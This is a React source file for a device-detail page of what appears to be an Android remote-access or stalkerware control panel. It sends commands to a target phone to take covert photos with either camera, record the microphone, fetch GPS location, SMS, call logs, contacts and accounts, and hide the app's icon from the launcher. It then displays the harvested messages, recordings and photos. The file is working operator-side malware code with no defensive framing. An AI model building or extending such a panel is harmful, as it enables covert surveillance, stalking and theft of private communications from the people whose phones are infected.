import React, { useState, useEffect, useCallback } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { devicesAPI, dataAPI, commandsAPI } from '../services/api';
import { toast } from 'react-toastify';
import {
  FiSmartphone,
  FiCamera,
  FiCameraOff,
  FiMic,
  FiMapPin,
  FiMessageSquare,
  FiPhone,
  FiUsers,
  FiPackage,
  FiKey,
  FiEye,
  FiEyeOff,
  FiHardDrive,
  FiChevronLeft,
  FiRefreshCw,
} from 'react-icons/fi';
import LoadingSpinner from '../components/LoadingSpinner';
import EmptyState from '../components/EmptyState';

const COMMANDS = [
  { type: 'capture_photo_front', label: 'Front Camera', icon: FiCameraOff, desc: 'Capture photo from front camera', color: 'text-blue-400' },
  { type: 'capture_photo_back', label: 'Back Camera', icon: FiCamera, desc: 'Capture photo from back camera', color: 'text-green-400' },
  { type: 'record_audio', label: 'Record Audio', icon: FiMic, desc: 'Record microphone audio (30s)', color: 'text-red-400' },
  { type: 'get_location', label: 'Get Location', icon: FiMapPin, desc: 'Fetch current GPS location', color: 'text-purple-400' },
  { type: 'get_sms', label: 'Get SMS', icon: FiMessageSquare, desc: 'Fetch all SMS messages', color: 'text-yellow-400' },
  { type: 'get_call_logs', label: 'Call Logs', icon: FiPhone, desc: 'Fetch call history', color: 'text-indigo-400' },
  { type: 'get_contacts', label: 'Contacts', icon: FiUsers, desc: 'Fetch contact list', color: 'text-pink-400' },
  { type: 'get_installed_apps', label: 'Installed Apps', icon: FiPackage, desc: 'List all installed apps', color: 'text-teal-400' },
  { type: 'get_accounts', label: 'Accounts', icon: FiKey, desc: 'Fetch device accounts', color: 'text-orange-400' },
  { type: 'hide_app', label: 'Hide App', icon: FiEyeOff, desc: 'Hide app icon from launcher', color: 'text-gray-400' },
  { type: 'unhide_app', label: 'Unhide App', icon: FiEye, desc: 'Show app icon in launcher', color: 'text-gray-300' },
  { type: 'get_storage_info', label: 'Storage Info', icon: FiHardDrive, desc: 'Get storage information', color: 'text-cyan-400' },
];

const DATA_TABS = ['locations', 'sms', 'calllogs', 'contacts', 'photos', 'recordings', 'commands'];

// Uploads are served at /uploads (not /api/uploads), so strip /api from the base URL
const UPLOADS_BASE_URL = (process.env.REACT_APP_API_URL || 'http://localhost:5000/api').replace(/\/api$/, '');

// Cloudinary URLs are full URLs (start with http). Local paths need the base URL prepended.
function resolveMediaUrl(filePath) {
  if (!filePath) return '';
  if (filePath.startsWith('http://') || filePath.startsWith('https://')) {
    return filePath; // Cloudinary full URL
  }
  return `${UPLOADS_BASE_URL}${filePath}`; // Local path
}

const ANDROID_VERSION_MAP = {
  29: '10', 30: '11', 31: '12', 32: '12L',
  33: '13', 34: '14', 35: '15', 36: '16',
};

function getAndroidLabel(sdk) {
  return ANDROID_VERSION_MAP[sdk] || sdk || 'N/A';
}

export default function DeviceDetail() {
  const { deviceId } = useParams();
  const navigate = useNavigate();
  const [device, setDevice] = useState(null);
  const [loading, setLoading] = useState(true);
  const [data, setData] = useState({});
  const [activeTab, setActiveTab] = useState('locations');
  const [sendingCmd, setSendingCmd] = useState(null);

  const loadDevice = useCallback(async () => {
    try {
      const res = await devicesAPI.getOne(deviceId);
      if (res.data?.success) {
        setDevice(res.data.device);
      } else {
        throw new Error('Device not found');
      }
    } catch (err) {
      toast.error(err.response?.data?.message || 'Device not found');
      navigate('/devices', { replace: true });
    } finally {
      setLoading(false);
    }
  }, [deviceId, navigate]);

  const loadData = useCallback(async () => {
    try {
      const res = await dataAPI.getDeviceData(deviceId, { type: activeTab, limit: 100 });
      if (res.data?.success) setData((prev) => ({ ...prev, [activeTab]: res.data.data[activeTab] || [] }));
    } catch (err) {
      console.error('Failed to load data:', err);
    }
  }, [deviceId, activeTab]);

  useEffect(() => {
    loadDevice();
  }, [loadDevice]);

  useEffect(() => {
    setData({});
    loadData();
    const interval = setInterval(loadData, 10000);
    return () => clearInterval(interval);
  }, [loadData]);

  const sendCommand = async (type, params = {}) => {
    setSendingCmd(type);
    try {
      await commandsAPI.send(deviceId, type, params);
      toast.success(`Command "${type}" sent to device`);
      setTimeout(loadData, 3000);
    } catch (err) {
      toast.error(err.response?.data?.message || 'Failed to send command');
    } finally {
      setSendingCmd(null);
    }
  };

  const TabIcon = ({ tab }) => {
    const icons = {
      locations: FiMapPin,
      sms: FiMessageSquare,
      calllogs: FiPhone,
      contacts: FiUsers,
      photos: FiCamera,
      recordings: FiMic,
      commands: FiPackage,
    };
    const Icon = icons[tab] || FiPackage;
    return <Icon className="mr-1.5" />;
  };

  if (loading) return <LoadingSpinner size="lg" />;

  if (!device) {
    return (
      <EmptyState
        icon={FiSmartphone}
        title="Device not found"
        description="The device may have been removed or doesn't exist"
        action={
          <button onClick={() => navigate('/devices')} className="btn-primary">
            Back to Devices
          </button>
        }
      />
    );
  }

  return (
    <div className="space-y-6">
      {/* Back button */}
      <button
        onClick={() => navigate('/devices')}
        className="text-sm text-gray-400 hover:text-white flex items-center gap-1 transition-colors"
      >
        <FiChevronLeft /> Back to Devices
      </button>

      {/* Device Header */}
      <div className="card p-6">
        <div className="flex items-start justify-between flex-wrap gap-4">
          <div className="flex items-center gap-4">
            <div className="w-14 h-14 bg-dark-700 rounded-xl flex items-center justify-center text-2xl text-gray-400">
              <FiSmartphone />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h1 className="text-2xl font-bold text-white">{device.deviceName || 'Unknown Device'}</h1>
                {device.isOnline && (
                  <span className="online-dot inline-block w-3 h-3 bg-green-400 rounded-full"></span>
                )}
              </div>
              <p className="text-gray-400">
                {device.manufacturer} {device.model}
              </p>
              <div className="flex flex-wrap items-center gap-3 mt-1 text-sm text-gray-500">
                <span>Android {getAndroidLabel(device.sdkVersion)}</span>
                <span>•</span>
                <span>SDK {device.sdkVersion}</span>
                <span>•</span>
                <span className="font-mono text-xs">ID: {device.deviceId}</span>
              </div>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <span className={device.isOnline ? 'badge-success text-sm' : 'badge-danger text-sm'}>
              {device.isOnline ? 'Online' : 'Offline'}
            </span>
            {device.isHidden && <span className="badge-warning text-sm">Hidden</span>}
          </div>
        </div>

        {/* Device info grid */}
        <div className="mt-4 grid grid-cols-2 md:grid-cols-4 gap-3 text-sm">
          <InfoBox label="Battery" value={`${device.batteryLevel}%${device.isCharging ? ' (Charging)' : ''}`} />
          <InfoBox label="Network" value={device.networkType || 'N/A'} />
          <InfoBox label="SIM Info" value={device.simInfo || 'N/A'} />
          <InfoBox label="Storage" value={`${device.usedStorage || '?'} / ${device.totalStorage || '?'}`} />
          <InfoBox label="IP Address" value={device.ipAddress || 'N/A'} />
          <InfoBox label="Apps Installed" value={device.installedApps?.length || 0} />
          <InfoBox label="Accounts" value={device.accounts?.length || 0} />
          <InfoBox label="First Connected" value={device.firstConnected ? new Date(device.firstConnected).toLocaleDateString() : 'N/A'} />
        </div>

        {/* Loading spinner for data refresh */}
        <button onClick={loadData} className="btn-secondary text-xs mt-3 flex items-center gap-1">
          <FiRefreshCw /> Refresh Data
        </button>
      </div>

      {/* Commands Grid */}
      <div className="card p-6">
        <h2 className="text-lg font-semibold text-white mb-4">Commands</h2>
        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-2">
          {COMMANDS.map((cmd) => {
            const Icon = cmd.icon;
            return (
              <button
                key={cmd.type}
                onClick={() => sendCommand(cmd.type)}
                disabled={sendingCmd === cmd.type || !device.isOnline}
                className="btn-secondary text-sm py-3 px-2 text-center disabled:opacity-40 disabled:cursor-not-allowed hover:bg-dark-600 transition-colors relative group"
                title={cmd.desc}
              >
                <Icon className={`text-lg mx-auto mb-1 ${cmd.color}`} />
                <div className="text-xs text-gray-400 truncate">{cmd.label}</div>
                {sendingCmd === cmd.type && (
                  <div className="absolute inset-0 bg-dark-800/80 rounded-lg flex items-center justify-center">
                    <FiRefreshCw className="animate-spin text-primary-400" />
                  </div>
                )}
              </button>
            );
          })}
        </div>
      </div>

      {/* Data Tabs */}
      <div className="card">
        <div className="card-header">
          <div className="flex items-center gap-2 overflow-x-auto">
            {DATA_TABS.map((tab) => {
              const Icon = { locations: FiMapPin, sms: FiMessageSquare, calllogs: FiPhone, contacts: FiUsers, photos: FiCamera, recordings: FiMic, commands: FiPackage }[tab] || FiPackage;
              return (
                <button
                  key={tab}
                  onClick={() => setActiveTab(tab)}
                  className={`flex items-center px-4 py-2 rounded-lg text-sm font-medium transition-colors whitespace-nowrap ${
                    activeTab === tab
                      ? 'bg-primary-600/20 text-primary-400 border border-primary-600/30'
                      : 'text-gray-400 hover:text-white hover:bg-dark-700'
                  }`}
                >
                  <Icon className="mr-1.5" />
                  {tab.charAt(0).toUpperCase() + tab.slice(1)}
                </button>
              );
            })}
          </div>
        </div>

        <div className="card-body">
          {renderDataContent(activeTab, data[activeTab], loadData)}
        </div>
      </div>
    </div>
  );
}

function InfoBox({ label, value }) {
  return (
    <div className="bg-dark-700/50 rounded-lg p-3">
      <p className="text-gray-500 text-xs">{label}</p>
      <p className="text-white font-medium truncate">{value}</p>
    </div>
  );
}

function renderDataContent(tab, items, refresh) {
  if (!items || items.length === 0) {
    return (
      <EmptyState
        title={`No ${tab} data available yet`}
        description="Send the relevant command to collect data"
      />
    );
  }

  switch (tab) {
    case 'locations':
      return (
        <div className="space-y-2 max-h-96 overflow-y-auto">
          {items.map((item, i) => (
            <div key={i} className="bg-dark-700/50 rounded-lg p-3 text-sm">
              <div className="flex justify-between">
                <span className="text-gray-300">
                  Lat: {item.latitude}, Lng: {item.longitude}
                </span>
                <span className="text-gray-500 text-xs">{new Date(item.timestamp).toLocaleString()}</span>
              </div>
              {item.address && <p className="text-gray-500 text-xs mt-1">{item.address}</p>}
              <p className="text-gray-500 text-xs mt-1">Accuracy: {item.accuracy}m | Provider: {item.provider}</p>
              <a
                href={`https://www.google.com/maps?q=${item.latitude},${item.longitude}`}
                target="_blank"
                rel="noopener noreferrer"
                className="text-primary-400 text-xs mt-1 inline-block hover:underline"
              >
                Open in Google Maps →
              </a>
            </div>
          ))}
        </div>
      );

    case 'sms':
      return (
        <div className="space-y-2 max-h-96 overflow-y-auto">
          {items.map((item, i) => (
            <div key={i} className={`rounded-lg p-3 text-sm ${item.type === 'inbox' ? 'bg-dark-700/50' : 'bg-primary-900/20'}`}>
              <div className="flex justify-between items-start">
                <span className="text-gray-300 font-medium">{item.address}</span>
                <div className="flex items-center gap-2">
                  <span className={`badge ${item.type === 'inbox' ? 'badge-info' : 'badge-success'} text-[10px] py-0`}>
                    {item.type}
                  </span>
                  <span className="text-gray-500 text-xs">{new Date(item.date).toLocaleString()}</span>
                </div>
              </div>
              <p className="text-gray-400 mt-1 text-xs whitespace-pre-wrap break-words">{item.body}</p>
            </div>
          ))}
        </div>
      );

    case 'calllogs':
      return (
        <div className="space-y-2 max-h-96 overflow-y-auto">
          {items.map((item, i) => (
            <div key={i} className="bg-dark-700/50 rounded-lg p-3 text-sm">
              <div className="flex justify-between items-center">
                <div>
                  <span className="text-gray-300">{item.name || 'Unknown'}</span>
                  <span className="text-gray-500 ml-2">{item.number}</span>
                </div>
                <div className="flex items-center gap-2">
                  <span className={`badge text-[10px] py-0 ${
                    item.type === 'incoming' ? 'badge-info' : item.type === 'outgoing' ? 'badge-success' : item.type === 'missed' ? 'badge-danger' : 'badge-warning'
                  }`}>
                    {item.type}
                  </span>
                  <span className="text-gray-500 text-xs">{item.duration}s</span>
                </div>
              </div>
              <p className="text-gray-500 text-xs mt-1">{new Date(item.date).toLocaleString()}</p>
            </div>
          ))}
        </div>
      );

    case 'contacts':
      return (
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 max-h-96 overflow-y-auto">
          {items.map((item, i) => (
            <div key={i} className="bg-dark-700/50 rounded-lg p-3 text-sm">
              <p className="text-white font-medium">{item.name || 'No Name'}</p>
              <p className="text-gray-400 text-xs">{item.number}</p>
              {item.email && <p className="text-gray-500 text-xs">{item.email}</p>}
            </div>
          ))}
        </div>
      );

    case 'photos':
      return (
        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-3 max-h-96 overflow-y-auto">
          {items.map((item, i) => (
            <div key={i} className="bg-dark-700/50 rounded-lg p-2">
              {item.filePath ? (
                <img
                  src={resolveMediaUrl(item.filePath)}
                  alt={item.fileName}
                  className="w-full h-32 object-cover rounded-lg"
                  onError={(e) => { e.target.style.display = 'none'; }}
                />
              ) : (
                <div className="w-full h-32 bg-dark-600 rounded-lg flex items-center justify-center text-gray-500">
                  <FiCamera />
                </div>
              )}
              <p className="text-xs text-gray-400 mt-1 truncate">{item.fileName}</p>
              <p className="text-xs text-gray-500">{item.dateTaken ? new Date(item.dateTaken).toLocaleDateString() : ''}</p>
            </div>
          ))}
        </div>
      );

    case 'recordings':
      return (
        <div className="space-y-2 max-h-96 overflow-y-auto">
          {items.map((item, i) => (
            <div key={i} className="bg-dark-700/50 rounded-lg p-3 text-sm">
              <div className="flex justify-between items-center">
                <span className="text-gray-300">{item.fileName}</span>
                <span className="text-gray-500 text-xs">{item.duration}s | {(item.fileSize / 1024).toFixed(1)}KB</span>
              </div>
              <p className="text-gray-500 text-xs mt-1">{new Date(item.timestamp).toLocaleString()}</p>
              {item.filePath && (
                <audio
                  controls
                  className="mt-2 w-full h-11"
                  src={resolveMediaUrl(item.filePath)}
                  preload="metadata"
                >
                  Your browser does not support this audio format.
                  <br />
                  <a
                    href={resolveMediaUrl(item.filePath)}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-primary-400 underline"
                  >
                    Download recording file
                  </a>
                </audio>
              )}
            </div>
          ))}
        </div>
      );

    case 'commands':
      return (
        <div className="space-y-2 max-h-96 overflow-y-auto">
          {items.map((item, i) => (
            <div key={i} className="bg-dark-700/50 rounded-lg p-3 text-sm">
              <div className="flex justify-between items-center">
                <span className="text-gray-300 font-medium">{item.type}</span>
                <div className="flex items-center gap-2">
                  <span className={`badge text-[10px] py-0 ${
                    item.status === 'completed' ? 'badge-success' : item.status === 'failed' ? 'badge-danger' : item.status === 'sent' ? 'badge-info' : 'badge-warning'
                  }`}>
                    {item.status}
                  </span>
                  <span className="text-gray-500 text-xs">{new Date(item.createdAt).toLocaleString()}</span>
                </div>
              </div>
              {item.params && Object.keys(item.params).length > 0 && (
                <pre className="text-gray-500 text-xs mt-1">{JSON.stringify(item.params)}</pre>
              )}
            </div>
          ))}
        </div>
      );

    default:
      return null;
  }
}